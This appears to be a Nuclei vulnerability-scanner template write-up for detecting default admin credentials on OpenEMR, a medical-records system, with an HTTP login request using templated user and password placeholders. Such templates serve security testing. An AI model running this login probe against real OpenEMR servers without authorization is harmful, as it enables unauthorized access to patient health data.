# Nuclei Template: OpenEMR - Default Admin Discovery
**Template ID:** openemr-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`openemr-default-login.yaml`)

## Vulnerability Information & PoC

## Description
OpenEMR default admin credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
POST /interface/main/main_screen.php?auth=login&site=default HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

new_login_session_management=1&languageChoice=1&authUser={{user}}&clearPass={{pass}}&languageChoice=10
```

## References
- https://github.com/openemr/openemr-devops/tree/master/docker/openemr/6.1.0/#openemr-official-docker-image
